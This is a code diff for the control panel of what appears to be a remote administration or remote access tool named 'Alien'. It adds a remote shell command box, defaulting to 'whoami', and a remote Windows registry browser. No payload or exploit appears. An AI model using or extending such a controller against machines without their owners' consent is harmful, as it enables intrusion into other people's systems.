@@ -1162,6 +1162,8 @@ namespace Alien
 
             //Shell
 
+            richTextBox2.Font = new Font("Consolas", Font.Size);
+            textBox3.Text = "whoami";
             textBox4.Text = "powershell.exe";
             textBox6.Text = "/bin/bash";
 
@@ -1302,6 +1304,7 @@ namespace Alien
 
             // Windows registry
             await fnRegInit();
+
         }
 
         private void frmControlPanel_Load(object sender, EventArgs e)
@@ -1927,7 +1930,50 @@ namespace Alien
                 if (result == null)
                     return;
 
-                MessageBox.Show(result.Subkeys.Count.ToString());
+                var subkeys = result.Subkeys;
+                foreach (string szSubKey in subkeys)
+                {
+                    if (fnFindNodeWithFullPath(nodeSelected.Nodes, szSubKey) != null)
+                        continue;
+
+                    TreeNode node = new TreeNode(szSubKey.Replace(nodeSelected.FullPath.Replace("Computer\\", string.Empty) + "\\", string.Empty));
+                    nodeSelected.Nodes.Add(node);
+                }
+
+                nodeSelected.Expand();
+
+                listView3.Items.Clear();
+
+                var values = result.Values;
+                foreach (var value in values)
+                {
+                    ListViewItem item = new ListViewItem(value.Name);
+                    item.SubItems.Add(value.Type);
+                    item.SubItems.Add(clsfnReg.fnFormatRegistryValue(value.Type, value.Data));
+
+                    listView3.Items.Add(item);
+                }
+            }
+        }
+
+        private async void textBox3_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                string szResp = await m_rShell.fnShellExec(textBox3.Text);
+
+                textBox3.Clear();
+                richTextBox2.Clear();
+                
+                richTextBox2.AppendText(szResp);
+            }
+            else if (e.KeyCode == Keys.Up)
+            {
+
+            }
+            else if (e.KeyCode == Keys.Down)
+            {
+
             }
         }
     }
